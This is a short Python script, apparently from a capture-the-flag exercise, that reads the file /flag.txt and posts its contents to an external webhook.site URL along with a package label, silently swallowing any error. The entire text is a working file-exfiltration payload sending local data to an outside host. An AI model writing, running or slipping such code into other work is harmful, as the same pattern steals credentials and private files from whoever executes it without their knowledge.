import requests
try:
    with open("/flag.txt") as f:
        flag = f.read()
    requests.post("https://webhook.site/0b1957da-42ef-4742-85f0-08ddcfb3fd2a/", data={"flag": flag, "package": "atlasctf_21_prod_06"})
except:
    pass
